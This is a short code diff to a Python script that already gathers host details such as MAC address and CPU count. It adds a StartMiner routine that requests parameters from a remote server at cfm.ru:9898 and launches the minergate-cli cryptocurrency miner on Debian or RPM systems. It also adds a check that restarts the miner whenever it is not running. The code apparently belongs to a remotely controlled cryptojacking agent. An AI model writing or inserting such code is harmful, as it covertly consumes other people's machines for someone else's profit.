@@ -82,8 +82,22 @@ def GetIpAddress():
 def GetCores():
     return os.cpu_count()
 
+#print(GetMac(),GetCores())
 
-print(GetMac(),GetCores())
+def StartMiner():
+    from conf import config
+
+    if config[0]['os'] == 'deb':
+        r = req.get('http://cfm.ru:9898/?uuid='+uuid+'&index='+index)
+        param = json.loads(r.text)
+        p = subprocess.Popen(["minergate-cli", "-user",param[0]['mail'], "-"+param[0]['val']+"",str(param[0]['core'])],stdout=subprocess.PIPE)
+        return True
+
+    if config[0]['os'] == 'rpm':
+        r = req.get('http://cfm.ru:9898/?uuid='+uuid+'&index='+index)
+        param = json.loads(r.text)
+        p = subprocess.Popen(["minergate-cli", "--user",param[0]['mail'], "--"+param[0]['val']+"",str(param[0]['core'])],stdout=subprocess.PIPE)
+        return True
 
 
 
@@ -154,7 +168,10 @@ else:
     pass
 
 
-
+if CheckProcess() == False:
+    StartMiner()
+else:
+    pass
 
 #KillProcess()
 #print(KillProcess())
